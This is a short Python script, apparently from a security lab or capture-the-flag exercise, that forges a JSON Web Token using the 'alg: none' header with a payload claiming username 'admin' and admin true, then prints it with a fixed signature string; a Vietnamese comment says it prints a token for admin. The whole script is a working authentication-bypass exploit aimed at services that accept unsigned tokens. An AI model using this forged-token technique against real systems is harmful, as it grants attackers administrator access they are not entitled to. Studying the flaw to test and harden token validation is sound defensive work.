import jwt
import base64


VERIFY_SIGNATURE = 'AXeh-1tmrMyAd4iBWdri6YSJebySwkhAOAuvCWMdcFs'

JOSE_header = '{"typ":"JWT","alg":"none"}'
JOSE_bytes = JOSE_header.encode('ascii')
base64_bytes = base64.b64encode(JOSE_bytes)
JOSE_header_encoded = base64_bytes.decode('ascii')
JOSE_header_encoded = JOSE_header_encoded.strip('=')


JOSE_payload = '{"username": "admin","admin": true}'
JOSE_bytes = JOSE_payload.encode('ascii')
base64_bytes = base64.b64encode(JOSE_bytes)
JOSE_payload_encodeed = base64_bytes.decode('ascii')
JOSE_payload_encodeed = JOSE_payload_encodeed.strip('=')

#In ra token voi username = admin
print(f"{JOSE_header_encoded}.{JOSE_payload_encodeed}.{VERIFY_SIGNATURE}")





